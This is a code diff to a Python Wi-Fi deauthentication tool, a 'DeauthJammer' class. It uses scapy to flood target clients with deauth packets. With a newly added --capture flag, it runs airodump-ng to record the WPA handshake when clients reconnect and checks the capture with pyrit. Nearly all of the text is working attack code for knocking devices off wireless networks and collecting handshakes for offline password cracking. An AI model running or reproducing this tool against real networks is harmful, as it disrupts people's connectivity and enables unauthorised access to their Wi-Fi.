@@ -41,7 +41,7 @@ class DeauthJammer(object):
 
         assert type(targets) is types.ListType
 
-        print "scapy.conf.iface set to "  + scapy.conf.iface
+        print "Using interface: "  + scapy.conf.iface
 
         AnalyzrCore.set_channel(scapy.conf.iface, channel)
 
@@ -50,8 +50,6 @@ class DeauthJammer(object):
         capture_filename = capture_prefix + "-01.cap"        
         if capture_handshake:
             FNULL = open(os.devnull, 'w')
-            # proc = subprocess.Popen(["tshark", "-i", scapy.conf.iface, "-w", capture_filename], stdin=None,
-                                    # stderr=FNULL, stdout=FNULL, close_fds=True)  # we might add -a as filter for only capturing unassociated clients
             proc = subprocess.Popen(["airodump-ng", "-c", str(channel), "-w", capture_prefix, scapy.conf.iface], stdin=None,
                                    stderr=FNULL, stdout=FNULL, close_fds=True)  # we might add -a as filter for only capturing unassociated clients
 
@@ -61,13 +59,13 @@ class DeauthJammer(object):
             self._threads.append(jamThread)
             jamThread.start()
 
-        print "Number of operating threads : " + str(threading.activeCount())
         try:
             while self._threads_finished < len(targets):
                 for thread in self._threads:
                     thread.join(.1)
 
             if capture_handshake:
+                print "Going to wait some seconds in order to give client time to reconnect..."
                 time.sleep(10)
                 proc.terminate()
                 proc.wait()
@@ -137,11 +135,18 @@ if __name__ == '__main__':
                             help="Amount of deauth-packages to be sent", metavar="COUNT")
     arg_parser.add_argument("-i, --iface", dest="iface", default="wlan0mon",
                             help="Interface to use for sending deauth-packages", metavar="IFACE")
+    arg_parser.add_argument("--capture", action='store_true', help="deauth_jammer will capture the network traffic during this attack and validate it with pyrit afterwards")
 
     parsed_options = arg_parser.parse_args()
     parsed_options.count = int(parsed_options.count)
     parsed_options.channel = int(parsed_options.channel)
 
     jammer = DeauthJammer(parsed_options.bssid, iface=parsed_options.iface)
-    print jammer.jam(parsed_options.client_mac, packet_count=parsed_options.count,
-                     channel=parsed_options.channel, capture_handshake=True)
+    result = jammer.jam(parsed_options.client_mac, packet_count=parsed_options.count,
+                     channel=parsed_options.channel, capture_handshake=parsed_options.capture)
+    print ""
+    print "=================================================="
+    print "Done!"
+    if parsed_options.capture:
+        print "Handshake captured (validated with pyrit): " + str(result["handshake_captured"])
+        print "Filename of dump: " + result["filename"]
